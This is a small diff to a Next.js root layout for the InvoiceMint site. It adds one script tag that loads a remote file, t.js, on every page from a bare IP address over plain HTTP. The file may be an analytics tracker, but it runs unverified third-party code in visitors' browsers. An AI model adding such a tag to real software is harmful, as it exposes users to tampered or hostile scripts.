@@ -62,6 +62,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         {children}
         <FloatingChatWrapper />
         <FeedbackWidget siteName="InvoiceMint" />
+        <Script defer data-site="invoicemint.cloud" src="http://31.97.56.148:3098/t.js" strategy="afterInteractive" />
         <BackToTop accentColor="#059669" />
       </body>
     </html>
